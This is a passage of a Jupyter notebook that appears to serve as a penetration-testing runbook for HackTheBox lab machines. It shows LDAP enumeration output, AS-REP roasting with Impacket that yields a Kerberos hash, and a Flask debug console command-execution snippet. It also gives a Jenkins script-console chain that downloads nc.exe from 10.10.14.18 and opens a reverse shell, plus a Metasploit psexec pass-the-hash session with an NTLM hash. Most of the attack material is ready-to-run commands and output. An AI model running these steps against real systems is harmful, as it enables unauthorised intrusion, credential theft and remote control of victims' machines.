      "# Domain Controllers, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# System, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# LostAndFound, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# Infrastructure, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# Program Data, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# NTDS Quotas, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# Keys, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# TPM Devices, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# Builtin, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# Hugo Smith, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# search reference\r\n",
      "ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST\r\n",
      " ICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# search reference\r\n",
      "ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST\r\n",
      " ICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# search reference\r\n",
      "ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC\r\n",
      " AL\r\n",
      "\r\n",
      "# search result\r\n",
      "search: 2\r\n",
      "result: 0 Success\r\n",
      "\r\n",
      "# numResponses: 19\r\n",
      "# numEntries: 15\r\n",
      "# numReferences: 3\r\n"
     ]
    }
   ],
   "source": [
    "outputLocationLDAP = boxDir + \"/ldapsearch.txt\"\n",
    "domain=\"dc=egotistical-bank,dc=local\"\n",
    "!ldapsearch -h $aIP -p 389 -x -b $domain > $outputLocationLDAP\n",
    "!cat $outputLocationLDAP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Generate List of Sam Accounts\n",
    "Parse the LDAP Information for a list of Sam Accounts\n",
    "\n",
    "Modify after the output occurs to remove unnecessary groups, etc.\n",
    "\n",
    "Note: This may not return some accounts like service accounts In hackthebox the machine Forest, it does not return svc-alfresco."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputLDAPUserList= boxDir + \"/userLDAP.txt\"\n",
    "!cat $outputLocationLDAP | grep -e sAMAccountName > $outputLDAPUserList\n",
    "!sed -i 's/sAMAccountName:\\s//' $outputLDAPUserList"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"getnpusers\"></a>\n",
    "## Impacket - GetNPUsers\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "If Kerberos Pre-Authentication is Disabled a hash will be returned.  A user account list can be passed to check this...\n",
    "\n",
    "Here is some powershell to check if you have privileges: \n",
    "````\n",
    "get-aduser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq \"True\" -and $_.Enabled -eq \"True\"} | select Name\n",
    "````\n",
    "\n",
    "The location of impacket may vary!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/.local/bin/GetNPUsers.py\n",
      "/home/kali/.local/bin/__pycache__/GetNPUsers.cpython-38.pyc\n",
      "/usr/share/doc/python3-impacket/examples/GetNPUsers.py\n"
     ]
    }
   ],
   "source": [
    "!locate GetNPUsers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Install impacket if this is the first time running GetNPUsers\n",
    "!pip install impacket\n",
    "\n",
    "# pyasn1 may not be installed also\n",
    "!pip install pyasn1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Location of GetNPUsers\n",
    "Set the location of the script below\n",
    "\n",
    "##### You need to generate a users.txt file to use in the enumeration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "fsmith\r\n"
     ]
    }
   ],
   "source": [
    "locationGetNPUsers=\"/usr/share/doc/python3-impacket/examples/GetNPUsers.py\"\n",
    "outputUsersTXT= boxDir + \"/users.txt\"\n",
    "# Make sure the domain is updated in the global settings\n",
    "domain = dnsName + \"/\"\n",
    "# After creating users.txt file - verify it exists\n",
    "!cat $outputUsersTXT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/usr/share/doc/python3-impacket/examples/GetNPUsers.py:413: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"?\n",
      "  if domain is '':\n",
      "Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation\n",
      "\n",
      "$krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL:c5fcbfe4f219b5dd5f8634bd4d67a9d0$99493b26fcd0da4d002167e6d3a55fdaf34ff7371eb335be2a5869f33b771351a1051ce3e8585a20ccbbd440a88ed7d7ba63dcbfc61fae67dc31331b106a2a84fbc299d8ff5f60b017b7b182d3712133d6cf31de66f5ee2ed572fdbbfd8c99330d4065e66438b1e6ba6322da2ddc15c23e234aa0fc82ed349e8a48e2525d1f766fddfd859386e2e333c4a7cdecae6a7a182b3113b05706038c94007f1016d9a69a1ed079ceef8377bce3cbde6b8967f9139b8038a5bc5981ce17101daa427959ca5ccbef9afa153af4743b8024052347be335bba1c986c26572ce935844f08ee34358a6f4d33ef5bb9495f350f99b863a69dd8fb18206f7c1d5a8100bae19ef7\n"
     ]
    }
   ],
   "source": [
    "locationNPUsers= boxDir + \"/npusers.txt\"\n",
    "# Modified the below command to use python3\n",
    "!python3 $locationGetNPUsers -dc-ip $aIP $domain -usersfile $outputUsersTXT -format john > $locationNPUsers\n",
    "!cat $locationNPUsers"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"getadusers\"></a>\n",
    "## Impacket - GetADUsers\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/usr/share/doc/python3-impacket/examples/GetADUsers.py:229: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"?\n",
      "  if domain is '':\n",
      "Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation\n",
      "\n",
      "[*] Querying 10.10.10.175 for information about domain.\n",
      "Name                  Email                           PasswordLastSet      LastLogon           \n",
      "--------------------  ------------------------------  -------------------  -------------------\n"
     ]
    }
   ],
   "source": [
    "locationGetADUsers=\"/usr/share/doc/python3-impacket/examples/GetADUsers.py\"\n",
    "saveADUsers= boxDir + \"/ADusers.txt\"\n",
    "domain = dnsName + \"/\"\n",
    "!python3 $locationGetADUsers $domain -dc-ip $aIP\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"linuxprivesc\"></a>\n",
    "## Linux privesc\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "LinEnum - https://github.com/rebootuser/LinEnum\n",
    "\n",
    "LinPeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"windowsprivesc\"></a>\n",
    "## Windows privesc\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Windows Exploit Suggester\n",
    "````\n",
    "https://github.com/AonCyberLabs/Windows-Exploit-Suggester\n",
    "Download to your pentest box\n",
    "# Download from Microsoft a list of the updates to check against\n",
    "./windows-exploit-suggester.py --update\n",
    "Downloaded the following file: 2020-12-02-mssb.xls\n",
    "On the windows computer execute systeminfo and copy into systeminfo.txt on pentest box\n",
    "# Upgrade xlrd to read the xls file\n",
    "pip install xlrd --upgrade\n",
    "./windows-exploit-suggester.py --database 2020-12-02-mssb.xls --systeminfo systeminfo.txt\n",
    "````\n",
    "\n",
    "References: https://github.com/egre55/windows-kernel-exploits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Download Windows-Exploit-Suggester Updated\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"flaskdebug\"></a>\n",
    "## Flask Debug Console\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "import subprocess\n",
    "p = subprocess.check_output('whoami', shell=True)\n",
    "print(p.decode('utf-8'))\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"jenkins\"></a>\n",
    "## Jenkins Console\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "Try and find the scripts console http://:5000/<page>/script\n",
    "\n",
    "In the console you can execute commands with the following...\n",
    "\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c dir'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "````\n",
    "\n",
    "Reference: https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password\n",
    "\n",
    "For powershell download a file locally to execute\n",
    "````\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c echo $wc=New-Object System.Net.WebClient;$url=\"http://10.10.14.18:8090/nc.exe\";$file=\"o.exe\";$wc.DownloadFile($url,$file) > s.ps1'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "\n",
    "````\n",
    "\n",
    "Verify the file written\n",
    "````\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c type s.ps1'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "````\n",
    "\n",
    "Execute the powershell file to download the nc.exe rename to o.exe\n",
    "````\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File s.ps1'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "````\n",
    "\n",
    "Execute o.exe for the reverse shell \n",
    "````\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c o.exe 10.10.14.18 8090 -e cmd.exe'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## metasploit psexec\n",
    "\n",
    "````\n",
    "msf5 > use exploit/windows/smb/psexec\n",
    "msf5 exploit(windows/smb/psexec) > set rhost 10.10.10.63\n",
    "rhost => 10.10.10.63\n",
    "msf5 exploit(windows/smb/psexec) > set rport 445\n",
    "rport => 445\n",
    "msf5 exploit(windows/smb/psexec) > show options\n",
    "\n",
    "Module options (exploit/windows/smb/psexec):\n",
    "\n",
    "   Name                  Current Setting  Required  Description\n",
    "   ----                  ---------------  --------  -----------\n",
    "   RHOSTS                10.10.10.63      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n",
    "   RPORT                 445              yes       The SMB service port (TCP)\n",
    "   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing\n",
    "   SERVICE_DISPLAY_NAME                   no        The service display name\n",
    "   SERVICE_NAME                           no        The service name\n",
    "   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share\n",
    "   SMBDomain             .                no        The Windows domain to use for authentication\n",
    "   SMBPass                                no        The password for the specified username\n",
    "   SMBUser                                no        The username to authenticate as\n",
    "\n",
    "\n",
    "Exploit target:\n",
    "\n",
    "   Id  Name\n",
    "   --  ----\n",
    "   0   Automatic\n",
    "````\n",
    "\n",
    "msf5 exploit(windows/smb/psexec) > set smbuser administrator\n",
    "smbuser => administrator\n",
    "msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\n",
    "smbpass => aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\n",
    "msf5 exploit(windows/smb/psexec) > exploit\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
